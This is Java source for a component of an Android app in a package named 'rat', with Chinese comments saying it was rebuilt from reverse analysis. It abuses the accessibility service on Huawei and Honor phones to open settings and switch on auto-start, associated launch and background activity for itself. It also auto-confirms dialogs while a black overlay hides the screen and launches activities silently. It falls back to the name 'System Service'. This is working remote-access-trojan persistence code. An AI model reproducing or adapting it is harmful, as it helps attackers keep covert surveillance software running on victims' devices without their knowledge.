package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.helper.StealthIntent;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 华为/荣耀厂商适配引擎
 *
 * 基于逆向分析: o/n.java (454 行) — 完整对齐
 *
 * 核心特性:
 *   - 荣耀适配: com.hihonor.systemmanager
 *   - 4种窗口检测: j0(华为设置)/i0(应用和服务)/k0(启动管理)/h0(对话框)
 *   - ConcurrentLinkedQueue 状态机
 *   - r0() 完整启动管理操作流程
 *   - 配置驱动文本匹配
 *
 * 监听的界面:
 *   - com.huawei.systemmanager / StartupAppControlActivity
 *   - com.hihonor.systemmanager / StartupAppControlActivity (荣耀)
 *   - com.android.settings / HWSettings
 *   - com.android.settings / SubSettings
 *   - AlertDialog (对话框)
 *
 * 市场份额: ~25%
 */
public class HuaweiEngine extends AutoEngine {

    private static final String TAG = "HuaweiEngine";

    // ====== 包名 ======
    private static final String HUAWEI_SM = "com.huawei.systemmanager";
    private static final String HONOR_SM = "com.hihonor.systemmanager";
    private static final String SETTINGS = "com.android.settings";

    // ====== Activity ======
    private static final String STARTUP_APP_CONTROL =
        "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity";
    private static final String STARTUP_NORMAL_LIST =
        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity";
    private static final String HONOR_STARTUP_APP_CONTROL =
        "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity";
    private static final String HW_SETTINGS = "com.android.settings.HWSettings";
    private static final String SUB_SETTINGS = "com.android.settings.SubSettings";
    private static final String CLEAN_SUB_SETTINGS = "com.android.settings.CleanSubSettings";
    private static final String APP_AND_NOTIFICATION =
        "com.android.settings.Settings$AppAndNotificationDashboardActivity";
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String ALERT_DIALOG = "android.app.AlertDialog";

    // ====== 状态常量 — 对应逆向 ConcurrentLinkedQueue ======
    private static final String ST_HW_SETTINGS = "keepAliveInHwSettings";
    private static final String ST_APP_NOTIF = "keepAliveInAppAndNotification";
    private static final String ST_STARTUP = "keepAlvieInStartupAppControl";
    private static final String ST_DIALOG = "keepAliveInAlertDialog";

    // ====== 状态字段 ======
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);

    private String appName;

    // 窗口检测分组
    private final List<WindowMatcher> startupWindows = new ArrayList<>();
    private final List<WindowMatcher> hwSettingsWins = new ArrayList<>();
    private final List<WindowMatcher> appNotifWins = new ArrayList<>();
    private final List<WindowMatcher> dialogWins = new ArrayList<>();

    public HuaweiEngine() {
        super(buildAllMatchers(), SETTINGS);
        buildDetectionGroups();

        // 定时任务: 50秒 — 对应逆向 schedule(new m(this, 4), 50L, SECONDS)
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { checkCompletion(); }
            }, 50L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    // ============ 窗口匹配 — 对应逆向 s0() ============

    private static List<WindowMatcher> buildAllMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 华为设置
        list.add(new WindowMatcher(SETTINGS, HW_SETTINGS)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS));
        list.add(new WindowMatcher(SETTINGS, CLEAN_SUB_SETTINGS));
        list.add(new WindowMatcher(SETTINGS, APP_AND_NOTIFICATION));
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));

        // 华为启动管理
        list.add(new WindowMatcher(HUAWEI_SM, STARTUP_APP_CONTROL)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(HUAWEI_SM, STARTUP_NORMAL_LIST));

        // 荣耀启动管理
        list.add(new WindowMatcher(HONOR_SM, HONOR_STARTUP_APP_CONTROL)
            .addEventType(32).addEventType(16384));

        // 对话框
        list.add(new WindowMatcher(HUAWEI_SM, ALERT_DIALOG));
        list.add(new WindowMatcher(HONOR_SM, ALERT_DIALOG));

        return list;
    }

    private void buildDetectionGroups() {
        startupWindows.add(new WindowMatcher(HUAWEI_SM, STARTUP_APP_CONTROL));
        startupWindows.add(new WindowMatcher(HUAWEI_SM, STARTUP_NORMAL_LIST));
        startupWindows.add(new WindowMatcher(HONOR_SM, HONOR_STARTUP_APP_CONTROL));

        hwSettingsWins.add(new WindowMatcher(SETTINGS, HW_SETTINGS));
        hwSettingsWins.add(new WindowMatcher(SETTINGS, CLEAN_SUB_SETTINGS));

        appNotifWins.add(new WindowMatcher(SETTINGS, SUB_SETTINGS));
        appNotifWins.add(new WindowMatcher(SETTINGS, APP_AND_NOTIFICATION));
        appNotifWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));

        dialogWins.add(new WindowMatcher(HUAWEI_SM, ALERT_DIALOG));
        dialogWins.add(new WindowMatcher(HONOR_SM, ALERT_DIALOG));
    }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 对应逆向: n.u(AccessibilityEvent, String, String)
     * 注意: vendor 使用独立 if (非 else-if), 所有状态都检查
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        try {
            if (isCompleted()) return;

            currentPackage = packageName;
            currentClassName = className;

            // 对应逆向: super.u(event, str, str2)
            if (event != null) {
                // base class event processing
            }

            boolean inHwSettings = j0();

            if (inHwSettings) {
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_STARTUP);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_HW_SETTINGS)) {
                    stateQueue.add(ST_HW_SETTINGS);
                    // case 0: handleHwSettings
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleHwSettings(); }
                    });
                }
            }
            if (i0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_STARTUP);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_APP_NOTIF)) {
                    stateQueue.add(ST_APP_NOTIF);
                    // case 1: handleAppAndNotification
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAppAndNotification(); }
                    });
                }
            }
            if (k0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_STARTUP)) {
                    stateQueue.add(ST_STARTUP);
                    // case 2: handleStartupControl
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleStartupControl(); }
                    });
                }
            }
            if (h0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_STARTUP);
                if (!stateQueue.contains(ST_DIALOG)) {
                    stateQueue.add(ST_DIALOG);
                    // case 3: handleAlertDialog
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAlertDialog(); }
                    });
                }
            }
        } catch (Exception e) {
            logError("事件处理异常", e);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    /**
     * vendor: HuaweiEngine 是纯事件驱动的，不主动启动
     * execute() 不应该调用 openStartupManagement()
     * 设置页面由 StrategyThread.applyBlockView() 打开
     * HuaweiEngine 被动检测窗口变化
     */
    @Override
    public void execute() {
        // vendor: 纯事件驱动，不主动执行
        log("HuaweiEngine is event-driven, waiting for window events");
    }

    // ============ 窗口检测 — 对应逆向 j0/i0/k0/h0 ============

    private boolean k0() { return matchesAny(startupWindows); }
    private boolean j0() { return matchesAny(hwSettingsWins); }
    private boolean i0() { return matchesAny(appNotifWins); }
    private boolean h0() { return matchesAny(dialogWins); }

    // ============ 打开启动管理 ============

    private void openStartupManagement() {
        try {
            showBlackScreen(true);
            updateProgress(10);
            startSilent(HUAWEI_SM, STARTUP_NORMAL_LIST);
            log("Opened Huawei startup management");
        } catch (Exception e) {
            logError("Huawei path failed", e);
            try {
                startSilent(HONOR_SM, HONOR_STARTUP_APP_CONTROL);
                log("Opened Honor startup management");
            } catch (Exception e2) {
                logError("Honor path also failed", e2);
                removeBlackScreen();
            }
        }
    }

    // ============ 启动管理操作 — 对齐逆向 r0() ============

    /**
     * 处理启动管理窗口
     * 对应逆向: r0() (第 247-358 行)
     *
     * 华为启动管理 UI 结构 (从 uiautomator dump 确认):
     *   每行: [ImageView 图标] [LinearLayout: [TextView 应用名] [TextView "自动管理"/"手动管理"]] [Switch]
     *   Switch checked=true → 自动管理 (需要关闭)
     *   Switch checked=false → 手动管理 (已经是我们要的)
     *   关闭 Switch → 弹出 AlertDialog → 点击确认
     *
     * 流程:
     *   1. 确定操作目标 (主进程/备用进程)
     *   2. 激活根节点 → 获取滚动视图
     *   3. 滚动查找应用
     *   4. 查找同行 Switch
     *   5. Switch checked → 点击关闭 → 等待对话框
     *   6. Switch unchecked → 已手动管理 → 处理下一个进程
     */
    private void handleStartupControl() {
        try {
            updateProgress(50);

            String target = getAppName();

            // 使用搜索查找应用 (不依赖滚动视图)
            UiNode appNode = searchAppInStartupControl(target);

            if (appNode == null) {
                logError("主进程App查找失败");
                saveState();
                Z();
                return;
            }

            log("主进程App查找成功");
            updateProgress(55);

            // 华为启动管理: 查找同行的 Switch
            UiNode parent = appNode.getParent();
            if (parent != null) parent = parent.getParent();
            UiNode switchNode = null;

            if (parent != null) {
                switchNode = parent.findOneByCombine(CombineFilter.switchWidget());
                if (switchNode == null) {
                    switchNode = parent.findOneByClassName("android.widget.Switch");
                }
            }

            if (switchNode == null) {
                UiNode clickableParent = appNode.findClickableParent();
                if (clickableParent != null) {
                    switchNode = clickableParent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                }
            }

            if (switchNode != null) {
                updateProgress(60);
                log("Switch 查找成功, checked=" + switchNode.isChecked());

                if (switchNode.isChecked()) {
                    log("自动管理已开启，点击关闭");
                    switchNode.click();
                    updateProgress(65);
                    T0(5);
                    return;
                } else {
                    mainAutoStart.set(true);
                    mainRelateStart.set(true);
                    mainBackground.set(true);
                    log("主进程已选择手动管理");
                    updateProgress(80);
                    saveState();
                    Z();
                }
            } else {
                logError("Switch 未找到");
                UiNode clickable = appNode.findClickableParent();
                if (clickable == null) clickable = appNode.getParent();
                if (clickable != null) {
                    clickable.click();
                    log("点击进入应用详情");
                    T0(5);
                    handleAppDetail();
                } else {
                    saveState();
                    Z();
                }
            }
        } catch (Exception e) {
            logError("启动管理操作异常", e);
        }
    }

    /**
     * 通过搜索框查找应用 — 不滚动列表
     */
    private UiNode searchAppInStartupControl(String appName) {
        try {
            G();
            UiNode root = k();
            if (root == null) return null;

            // 1. 查找搜索框
            UiNode searchBox = root.findOneByClassName("android.widget.AutoCompleteTextView");
            if (searchBox == null) {
                searchBox = root.findOneById("com.huawei.systemmanager:id/et_search");
            }
            if (searchBox == null) {
                UiNode searchView = root.findOneByClassName("android.widget.SearchView");
                if (searchView != null) {
                    searchBox = searchView.findOneByClassName("android.widget.AutoCompleteTextView");
                    if (searchBox == null) {
                        searchBox = searchView.findOneByClassName("android.widget.EditText");
                    }
                }
            }

            if (searchBox != null) {
                // 2. 点击搜索框激活
                searchBox.click();
                T0(3);

                // 3. 输入应用名
                android.os.Bundle args = new android.os.Bundle();
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    appName);
                searchBox.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                log("搜索框输入: " + appName);
                T0(5); // 等待搜索结果

                // 4. 刷新根节点，查找搜索结果
                G();
                root = k();
                if (root != null) {
                    UiNode result = root.findOneByTextContains(appName);
                    if (result != null) {
                        log("搜索结果找到: " + appName);
                        return result;
                    }
                }
            } else {
                log("搜索框未找到，使用直接查找");
            }

            // fallback: 直接在当前页面查找
            G();
            root = k();
            if (root != null) {
                return root.findOneByTextContains(appName);
            }
        } catch (Exception e) {
            logError("searchAppInStartupControl error", e);
        }
        return null;
    }

    // ============ 应用详情 — 3 个开关 ============

    private void handleAppDetail() {
        UiNode root = getRootNode();
        if (root == null) return;

        // 开关 1: 允许自启动
        toggleSwitch(root, "HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", mainAutoStart);
        T0(3);

        // 开关 2: 允许关联启动
        root = getRootNode();
        if (root != null) {
            toggleSwitch(root, "HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", mainRelateStart);
        }
        T0(3);

        // 开关 3: 允许后台活动
        root = getRootNode();
        if (root != null) {
            toggleSwitch(root, "HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", mainBackground);
        }

        updateProgress(80);
        log("主进程 3个开关处理完成");

        T0(3);
        performBack();

        saveState();
        finish();
    }

    private void toggleSwitch(UiNode root, String configKey, AtomicBoolean flag) {
        CombineFilter filter = buildTextViewFilter(configKey);
        if (filter == null) return;

        UiNode label = root.findOneByCombine(filter);
        if (label == null) {
            logError("开关标签未找到: " + configKey);
            return;
        }

        UiNode parent = label.findClickableParent();
        if (parent == null) parent = label.getParent();
        if (parent == null) return;

        UiNode sw = parent.findOneByClassName("android.widget.Switch");
        if (sw == null) sw = parent.findOneByCombine(CombineFilter.switchWidget());

        if (sw != null) {
            if (!sw.isChecked()) {
                sw.click();
                log("已开启: " + configKey);
            } else {
                log("已经开启: " + configKey);
            }
            flag.set(true);
        } else {
            logError("Switch 未找到: " + configKey);
        }
    }

    // ============ 对话框 ============

    private void handleAlertDialog() {
        T0(3);
        UiNode root = getRootNode();
        if (root == null) return;

        List<String> texts = getConfigTexts("COMMON_CONFIRM_TEXT");
        if (texts != null) {
            for (String text : texts) {
                UiNode btn = root.findOneByCombine(CombineFilter.button(text));
                if (btn != null) {
                    btn.click();
                    log("点击对话框: " + text);
                    updateProgress(70);
                    T0(5);
                    return;
                }
            }
        }

        texts = getConfigTexts("COMMON_ALLOW_TEXT");
        if (texts != null) {
            for (String text : texts) {
                UiNode btn = root.findOneByCombine(CombineFilter.button(text));
                if (btn != null) {
                    btn.click();
                    log("点击允许: " + text);
                    return;
                }
            }
        }
        logError("对话框按钮未找到");
    }

    // ============ 华为设置 / 应用和服务 ============

    /**
     * case 0: handleHwSettings — 在华为主设置页面点击"应用和通知"
     * vendor 真机日志:
     *   03:59:47.836  keepAliveInHwSettings 窗口匹配
     *   03:59:49.841  active root complete
     *   03:59:49.860  查找华为系统设置滚动视图成功
     *   03:59:49.969  已点击进入应用和服务栏目
     *
     * vendor 逻辑 (o/m.java case 0):
     *   1. G() — 激活根节点 (带重试)
     *   2. Q() — 获取滚动视图
     *   3. 查找"应用和通知"文本节点
     *   4. 点击该节点
     */
    private void handleHwSettings() {
        try {
            T0(3);
            log("keepAliveInHwSettings 窗口匹配 → handleHwSettings");

            // vendor: G() — 激活根节点
            G();
            log("active root complete");

            CombineFilter filter = buildTextViewFilter("HUA_WEI_APP_AND_NOTIFICATION_TEXT");
            if (filter == null) {
                logError("HUA_WEI_APP_AND_NOTIFICATION_TEXT 配置为空");
                return;
            }

            // 带重试查找 — 如果在子页面则 BACK 退出
            UiNode node = null;
            for (int retry = 0; retry < 10; retry++) {
                UiNode scrollView = Q();
                UiNode searchRoot = scrollView != null ? scrollView : k();
                if (searchRoot == null) {
                    G();
                    T0(5);
                    continue;
                }

                node = searchRoot.findOneByCombine(filter);
                if (node != null) break;

                if (scrollView != null) {
                    node = scrollView.scrollForwardUntil(filter);
                    if (node != null) break;
                }

                // 可能还在子页面 (如"已安装的服务")，BACK 退出到上级
                if (retry < 3) {
                    log("应用和通知未找到，BACK 退出子页面 (" + (retry + 1) + "/3)");
                    performBack();
                    T0(5);
                } else {
                    log("应用和通知未找到，重试 " + (retry + 1) + "/10");
                    T0(5);
                }
                G();
            }

            if (node != null) {
                node.click();
                log("已点击进入应用和服务栏目");
            } else {
                logError("应用和通知栏目未找到 (10次重试后)");
            }
        } catch (Exception e) {
            logError("handleHwSettings error", e);
        }
    }

    /**
     * case 1: handleAppAndNotification — 在"应用和服务"页面点击"启动管理"
     * vendor 真机日志:
     *   03:59:50.111  keepAliveInAppAndNotification 窗口匹配
     *   03:59:52.113  active root complete
     *   03:59:52.118  应用和服务窗口滚动视图查找成功
     *   03:59:52.132  应用启动管理栏目查找成功
     *   03:59:52.151  点击应用启动管理栏目完成
     *
     * vendor 逻辑 (o/m.java case 1):
     *   1. G() — 激活根节点
     *   2. Q() — 获取滚动视图
     *   3. 查找"启动管理"文本节点
     *   4. 点击该节点 → 进入启动管理页面 → k0() 匹配
     */
    private void handleAppAndNotification() {
        try {
            T0(3);
            log("keepAliveInAppAndNotification 窗口匹配 → handleAppAndNotification");

            // vendor: G() — 激活根节点
            G();
            log("active root complete");

            // vendor: Q() — 获取滚动视图
            UiNode scrollView = Q();
            if (scrollView != null) {
                log("应用和服务窗口滚动视图查找成功");
            } else {
                log("滚动视图未找到，使用根节点");
            }

            // vendor: 查找"启动管理"文本 — 不是点击应用名!
            // vendor 使用 "应用启动管理" / "启动管理" 文本匹配
            UiNode searchRoot = scrollView != null ? scrollView : k();
            if (searchRoot == null) {
                logError("根节点为空");
                return;
            }

            // 尝试多个候选文本
            String[] startupTexts = {"应用启动管理", "启动管理", "Startup manager"};
            UiNode node = null;
            for (String text : startupTexts) {
                node = searchRoot.findOneByTextContains(text);
                if (node != null) break;
                // 滚动查找
                if (scrollView != null) {
                    node = scrollView.scrollForwardUntil(CombineFilter.textView(text));
                    if (node != null) break;
                }
            }

            if (node != null) {
                log("应用启动管理栏目查找成功");
                node.click();
                log("点击应用启动管理栏目完成");
            } else {
                logError("启动管理栏目未找到");
            }
        } catch (Exception e) {
            logError("handleAppAndNotification error", e);
        }
    }

    // ============ 状态管理 — 对应逆向 t0() ============

    private void saveState() {
        log("保存保活策略 — 主进程: auto=" + mainAutoStart.get()
            + " relate=" + mainRelateStart.get() + " bg=" + mainBackground.get());
    }

    private void checkCompletion() {
        if (isCompleted()) return;
        if (mainAutoStart.get() && mainBackground.get()) {
            log("所有华为权限已授予");
            finish();
        }
    }

    private String getAppName() {
        if (appName != null) return appName;
        // vendor: 从 config 或 context 获取应用标签名 (不是包名)
        try {
            android.content.Context ctx = getContext();
            if (ctx != null) {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(ctx.getPackageName(), 0);
                String label = pm.getApplicationLabel(ai).toString();
                if (label != null && !label.isEmpty()) {
                    appName = label;
                    return appName;
                }
            }
        } catch (Exception e) {
            logError("getAppName error", e);
        }
        return "System Service";
    }

    public void setAppName(String name) { this.appName = name; }
}
